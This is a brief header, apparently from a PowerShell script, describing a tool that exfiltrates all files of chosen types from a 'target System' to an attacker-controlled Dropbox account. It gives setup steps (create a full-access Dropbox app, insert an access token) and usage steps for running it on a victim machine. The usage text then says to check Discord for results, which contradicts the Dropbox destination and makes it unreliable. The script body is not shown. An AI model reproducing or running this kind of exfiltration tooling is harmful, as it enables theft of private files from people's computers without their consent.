
<h2 align="center"> Exfiltrate Files to Dropbox </h2>

SYNOPSIS

Uses Powershell to Exfiltrate all files of all specified filetypes to a DropBox account.

SETUP

make an app at https://www.dropbox.com/developers/apps (make sure to grant full access to your new app)
generate an access token for your app and replace DROPBOX_ACCESS_TOKEN_HERE.

USAGE

1. Input your credentials below
2. Run Script on target System
3. Check Discord for results

#>